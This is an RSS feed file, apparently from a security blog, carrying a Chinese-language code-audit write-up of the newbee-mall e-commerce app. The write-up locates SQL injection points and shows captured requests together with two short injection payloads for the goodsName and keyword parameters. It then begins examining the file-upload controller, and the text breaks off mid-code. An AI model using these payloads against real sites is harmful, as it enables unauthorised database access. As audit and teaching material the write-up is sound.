@@ -1,0 +1,948 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Code Audit on hadagaga blog</title><link>https://hadagaga.github.io/tags/code-audit/</link><description>Recent content in Code Audit on hadagaga blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 25 Nov 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://hadagaga.github.io/tags/code-audit/index.xml" rel="self" type="application/rss+xml"/><item><title>newbee-mall</title><link>https://hadagaga.github.io/p/newbee-mall/</link><pubDate>Mon, 25 Nov 2024 00:00:00 +0000</pubDate><guid>https://hadagaga.github.io/p/newbee-mall/</guid><description>&lt;img src="https://hadagaga.github.io/p/newbee-mall/cover.png" alt="Featured image of post newbee-mall" />&lt;h2 id="项目技术栈spring-bootmavenmybatis">项目技术栈:spring boot+maven+mybatis
+&lt;/h2>&lt;h2 id="项目依赖审计">项目依赖审计
+&lt;/h2>&lt;p>​ 依赖项中引入并不多，而已引入的依赖项也并没有可以进行利用的漏洞。&lt;/p>
+&lt;h2 id="单点漏洞审计">单点漏洞审计
+&lt;/h2>&lt;h3 id="sql注入">SQL注入
+&lt;/h3>&lt;p>​ 在全局搜索中搜索${，搜到如下结果：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/newbee-mall/1-1732536691802-2.png"
+width="978"
+height="290"
+srcset="https://hadagaga.github.io/p/newbee-mall/1-1732536691802-2_hu16603502384029231271.png 480w, https://hadagaga.github.io/p/newbee-mall/1-1732536691802-2_hu12137680583754643985.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="337"
+data-flex-basis="809px"
+>&lt;/p>
+&lt;p>​ 我们逐个追踪&lt;/p>
+&lt;h4 id="newbeemallgoodsmapperxml">NewBeeMallGoodsMapper.xml
+&lt;/h4>&lt;p>​ 该文件中有四个地方使用了$，先追溯第一个：&lt;/p>
+&lt;h5 id="goodsname">goodsName
+&lt;/h5>&lt;p>&lt;img src="https://hadagaga.github.io/p/newbee-mall/2-1732536691802-3.png"
+width="994"
+height="345"
+srcset="https://hadagaga.github.io/p/newbee-mall/2-1732536691802-3_hu15563882175293925477.png 480w, https://hadagaga.github.io/p/newbee-mall/2-1732536691802-3_hu15068348633409169356.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="288"
+data-flex-basis="691px"
+>&lt;/p>
+&lt;p>​ 向上追溯：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/newbee-mall/3-1732536691802-4.png"
+width="1014"
+height="297"
+srcset="https://hadagaga.github.io/p/newbee-mall/3-1732536691802-4_hu14914247218957451491.png 480w, https://hadagaga.github.io/p/newbee-mall/3-1732536691802-4_hu6666499882162058769.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="341"
+data-flex-basis="819px"
+>&lt;/p>
+&lt;p>​ 可以看到路由是/goods/list，定位到前端的商品管理模块，抓包：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/admin/goods/list?_search=false&amp;amp;nd=1732506895164&amp;amp;limit=20&amp;amp;page=1&amp;amp;sidx=&amp;amp;order=asc&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">192.168.83.43:8888&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">application/json, text/javascript, */*; q=0.01&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">X-Requested-With&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">XMLHttpRequest&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://192.168.83.43:8888/admin/goods&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cookie&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">JSESSIONID=9A8E8D2487BFF9957C6725FB53EE6802&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">close&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里我们构造一个参数goodsName&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/admin/goods/list?_search=false&amp;amp;nd=1732506895164&amp;amp;limit=20&amp;amp;page=1&amp;amp;sidx=&amp;amp;order=asc&amp;amp;goodsName=123&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">192.168.83.43:8888&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">application/json, text/javascript, */*; q=0.01&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">X-Requested-With&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">XMLHttpRequest&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://192.168.83.43:8888/admin/goods&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cookie&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">JSESSIONID=9A8E8D2487BFF9957C6725FB53EE6802&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">close&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 可以发现成功筛选了商品，尝试注入。输入单引号后发现出现错误，尝试闭合SQL语句。测试后发现该注入点可进行SQL盲注&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="s1">&amp;#39;)and+false%23。
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h5 id="keyword">keyword
+&lt;/h5>&lt;h5 id="img4-1732536691802-5png">&lt;img src="https://hadagaga.github.io/p/newbee-mall/4-1732536691802-5.png"
+width="982"
+height="347"
+srcset="https://hadagaga.github.io/p/newbee-mall/4-1732536691802-5_hu17028785396915315720.png 480w, https://hadagaga.github.io/p/newbee-mall/4-1732536691802-5_hu93525120891155699.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="282"
+data-flex-basis="679px"
+>
+&lt;/h5>&lt;p>​ 向上追溯：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/newbee-mall/5-1732536691802-6.png"
+width="1011"
+height="442"
+srcset="https://hadagaga.github.io/p/newbee-mall/5-1732536691802-6_hu15747561224441774475.png 480w, https://hadagaga.github.io/p/newbee-mall/5-1732536691802-6_hu1240867846970139472.png 1024w"
+loading="lazy"
+alt="img"
+class="gallery-image"
+data-flex-grow="228"
+data-flex-basis="548px"
+>&lt;/p>
+&lt;p>​ 发现路由为/search，猜测是前端的首页的搜索功能，进行搜索后抓包：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/search?keyword=12312&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">172.21.80.85:8888&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Pragma&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">no-cache&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cache-Control&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">no-cache&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade-Insecure-Requests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://172.21.80.85:8888/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cookie&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">JSESSIONID=CECCAACA0B3830B58F86BAF491DD38A5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">close&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 尝试输入单引号，发现报错，尝试闭合后拼接语句。payload如下：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;)+or+false+and+concat(&amp;#39;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 其余两个注入点与前两个注入点属于同一个功能的注入点，因此这里不再追溯审计&lt;/p>
+&lt;h3 id="任意命令执行">任意命令执行
+&lt;/h3>&lt;p>​ 没有找到使用了命令执行函数的功能点&lt;/p>
+&lt;h3 id="任意文件操控上传读取修改等">任意文件操控（上传，读取，修改等）
+&lt;/h3>&lt;p>​ 搜索upload，定位到控制器&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@Controller&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nd">@RequestMapping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/admin&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">public&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">class&lt;/span> &lt;span class="nc">UploadController&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nd">@PostMapping&lt;/span>&lt;span class="p">({&lt;/span>&lt;span class="s">&amp;#34;/upload/file&amp;#34;&lt;/span>&lt;span class="p">})&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nd">@ResponseBody&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">public&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Result&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">upload&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">HttpServletRequest&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">httpServletRequest&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nd">@RequestParam&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;file&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MultipartFile&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">throws&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">URISyntaxException&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fileName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">getOriginalFilename&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">suffixName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fileName&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fileName&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">lastIndexOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">//生成文件名称通用方法&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">SimpleDateFormat&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sdf&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">SimpleDateFormat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;yyyyMMdd_HHmmss&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Random&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Random&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">StringBuilder&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">tempName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">StringBuilder&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">tempName&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sdf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Date&lt;/span>&lt;span class="p">())).&lt;/span>&lt;span class="na">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">nextInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">100&lt;/span>&lt;span class="p">)).&lt;/span>&lt;span class="na">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">suffixName&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">newFileName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">tempName&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">File&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fileDirectory&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">File&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Constants&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">FILE_UPLOAD_DIC&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">//创建文件&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">File&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">destFile&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">File&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Constants&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">FILE_UPLOAD_DIC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">newFileName&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">try&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">fileDirectory&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">exists&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">fileDirectory&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">mkdir&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">throw&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IOException&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;文件夹创建失败,路径为：&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fileDirectory&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">transferTo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">destFile&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
